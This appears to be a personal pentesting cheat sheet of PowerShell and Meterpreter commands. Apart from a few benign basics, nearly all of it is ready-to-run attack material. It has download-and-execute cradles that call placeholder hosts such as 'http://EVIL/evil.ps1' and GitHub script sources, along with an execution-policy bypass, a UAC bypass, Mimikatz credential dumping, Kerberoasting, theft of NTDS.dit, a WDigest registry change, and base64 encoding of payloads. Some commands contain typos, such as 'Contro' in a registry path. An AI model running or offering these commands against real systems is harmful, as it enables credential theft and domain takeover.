Meterpreter Powershell
======================

load powershell

powershell_import /home/test/Desktop/Evil.ps

powershell_execute "$PSVersionTable"

powershell_execute "Get-Service -Name BITS"


PowerShell
===========

Write-Host 'Hello World!'

Get-Command                   # Show all commands.
Get-Content
Get-Eventlog system
Get-Process                   # Show current running processes.
Set-Content
------------------------------------------------------------------------------------------------------

# Pop-up window

[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[System.Windows.Forms.MessageBox]::Show("<message>" , "<Windows title" , <# - button options>)

Example:
[System.Windows.Forms.MessageBox]::Show("Hello World!" , "Important Message" , 1)

Button options:
0  OK
1  OK, Cancel
2  Abort, Retry, Ignore
3  Yes, No, Cancel
4  Yes, No
5  Retry, Cancel
------------------------------------------------------------------------------------------------------

# Speak

(New-Object -ComObject SAPI.SPVoice).Speak(“Hello World!”)
------------------------------------------------------------------------------------------------------

# Error message

The file Cannot be loaded because the execution of scripts is disabled on this system. Bypass it.

powershell.exe -executionpolicy bypass -file <file>

Use the same command to run a file remotely on a Windows system from an active Meterpreter shell.
------------------------------------------------------------------------------------------------------

# PS Attack

Get-GPPPassword

get-attack “active directory”
get-help Get-NetUser
Get-NetUser -UserName <user>

get-attack groups
get-help Get-NetLocalGroup
Get-NetLocalGroup -GroupName “Administrators”
---------------------------------------------------------

Restart PS Attack and run as a local user Administrator.

get-attack “local admin”
Find-LocalAdminAccess

get-attack find
get-help Invoke-UserHunter
Invoke-UserHunter -Examples
Invoke-UserHunter -CheckAccess

Get-Attack mimi
get-help Invoke-Mimikatz
Invoke-Mimikatz -ComputerName <target> -DumpCreds
---------------------------------------------------------

Restart PS Attack and run as a Domain Admin.

get-attack “domain controller”
Get-NetDomainController

get-attack copy
get-help Invoke-NinjaCopy -Examples
Invoke-NinjaCopy -Path “C:\windows\ntds\ntds.dit” -ComputerName <target> -LocalDestination “C:\ntds.dit”
(takes a little while)
ls
---------------------------------------------------------

PS Attack build tool


----------------------------------------------------------
PS Download Attack

powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1'); Get-NetDomain"

C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://**********.com/')

# normal download cradle
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# PowerShell 3.0+
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe IEX (iwr 'http://EVIL/evil.ps1')

# hidden IE com object
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

-----------------------------------------------------------
Github Projeler

Powershell Empire
PowerSploit
Nishang
PowerOPS
p0wnedShell
Inveigh
Unicorn


 
# PowerShell 
======================================

# Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

# Invoke-Inveigh and log output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe

# Insert reg key to enable Wdigest on newer versions of Windows
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1

Other use PowerShell
=====================

get-Content "XxxxxxX.lnk"


1. List *.lnk
===========

$WScript = New-Object -ComObject WScript.Shell
$shortcut = Get-ChildItem *.link
$shortcut

2. Details *.lnk
==============

$WScript.CreateShortcut($shortcut)

runas /user:ACCESS\Administrator /savecred "whoami > C:/Users/Public/Desktop/test"

echo -n "IEX(New-Object Net.WebClient).downloadString('http://X.X.X.X:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
